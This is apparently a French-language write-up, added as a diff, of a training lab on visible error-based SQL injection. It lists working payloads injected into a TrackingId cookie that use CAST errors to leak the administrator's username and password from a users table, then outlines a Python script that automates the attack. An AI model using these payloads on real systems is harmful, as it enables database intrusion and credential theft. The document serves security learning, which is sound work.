@@ -1,0 +1,51 @@
+# Visible error-based SQL injection
+
+Ce laboratoire contient une vulnérabilité d'injection SQL. L'application utilise un cookie de suivi pour l'analyse, et effectue une requête SQL contenant la valeur du cookie soumis. Les résultats de la requête SQL ne sont pas renvoyés.
+
+La base de données contient un tableau différent appelé users, avec des colonnes appelées usernameet password. Pour résoudre le laboratoire, trouver un moyen de laisser le mot de passe pour le administratorutilisateur, puis connectez-vous à son compte.
+
+_______________________________________________________
+
+
+#Objectif : Retrouver les mot de passe de l'administrator puis se connecter à son compte :
+
+_______________________________________________________
+
+#Resolution
+
+
+    TrackingId=ogAZZfxtOKUELbuJ' : vulnérabilité d'injection SQL detecté ! 
+
+    TrackingId=ogAZZfxtOKUELbuJ'-- :  la requête est maintenant valide syntaxiquement. Cela nous confirme la vulnérabilité
+
+    TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- : on obtient maintenant une erreur différente disant qu'un AND la condition doit être une expression booléenne.
+
+    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- : Pour avoir une valeur boolenne de type True ou False on ajoute un opérateur de comparaison (=) comme suit
+
+    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)-- : On essaie de recuperer les utilisateurs contenu dans la table users mais on obitent une erreur car il y a une limite de charactère
+
+    TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- : On supprimer la valeur contenu dans le tracking id mais nous avons un nouveau message d'erreur parce que la reponse fait plus d'une ligne
+
+    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- : donc on precise que nous voulons qu'une seule ligne : cela nous renvois une erreur mais tout en nous confirmant que le premier utilisateur est administrator
+
+    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- : on veut uniquement le premier mot de passe dans l'erreur visible puis on se connecte à son compte 
+
+_______________________________________________________
+
+Ecriture du Script python 
+
+
+#Analyse pour Ecriture du Script python 
+
+0- Initialiser une session et lutiliser pour le reste du script 
+
+1- Recuperer le cookies
+
+2- Injecter le payload sans rien mettre dans le tracking id contenu dans le cookies pour recuperer le mot de passe
+
+3- Recuperer le csrf 
+
+4- Sur la page login se connecter pour solve le lab 
+
+
+
